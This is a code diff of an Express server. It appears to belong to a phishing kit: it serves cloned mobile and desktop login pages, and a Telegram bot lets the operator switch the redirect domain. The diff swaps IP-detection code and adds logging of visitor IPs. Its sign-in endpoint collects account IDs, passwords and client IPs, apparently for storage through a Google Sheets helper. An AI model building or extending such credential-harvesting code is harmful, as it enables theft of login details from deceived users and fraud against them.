@@ -1,5 +1,4 @@
 const express = require("express");
-const requestIp = require("request-ip");
 require("dotenv").config();
 const path = require("path");
 const PORT = process.env.PORT || 3001;
@@ -10,6 +9,7 @@ const { googleSheetApi } = require("./utils/api");
 const bodyParser = require("body-parser");
 const app = express();
 app.use(express.json());
+app.set('trust proxy', true);
 app.set("view engine", "ejs");
 app.use(bodyParser.urlencoded({ extended: false }));
 app.set("views", path.join(__dirname, "views"));
@@ -23,7 +23,6 @@ const TelegramBot = require("node-telegram-bot-api");
 const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
 let redirectDomain = "https://ggys5hav.net";
 
-app.use(requestIp.mw());
 
 if (redirectDomain === "") {
   bot.sendMessage(
@@ -39,7 +38,6 @@ bot.onText(/\/domain (.+)/, (msg, match) => {
   bot.sendMessage(chatId, `Tên miền đã được thay đổi thành: ${redirectDomain}`);
 });
 const axios = require("axios");
-app.set("trust proxy", true);
 app.use((req, res, next) => {
   const userAgent = req.headers["user-agent"];
   const isMobile = /mobile/i.test(userAgent);
@@ -48,6 +46,7 @@ app.use((req, res, next) => {
 });
 
 app.get("/", (req, res) => {
+  
   if (req.isMobile) {
     return res.render("mobile/index", {
       layout: "mobile/layout",
@@ -59,6 +58,8 @@ app.get("/", (req, res) => {
 });
 
 app.get('/Home/Index', (req, res) => {
+  let ip = req.ip;
+  console.log(ip);
   return res.render("desktop/index", {
     layout: "desktop/layout",
     redirectDomain: redirectDomain,
@@ -110,7 +111,7 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
       timeZone: "Asia/Ho_Chi_Minh",
     });
 
-    const userIp = requestIp.getClientIp(req);
+    const userIp = req.ip;
 
     // Prepare data to be stored
     const data = {
@@ -160,8 +161,8 @@ app.post("/api/Authorize/SignIn", async (req, res) => {
   // Get the user's IP address
   // If using a proxy (like Nginx), 'x-forwarded-for' contains the real IP
   // Otherwise, fallback to req.ip
-  const userIp = requestIp.getClientIp(req);
-  const data = {
+  const userIp = req.ip;
+    const data = {
     action: "login",
     AccountID,
     AccountPWD,
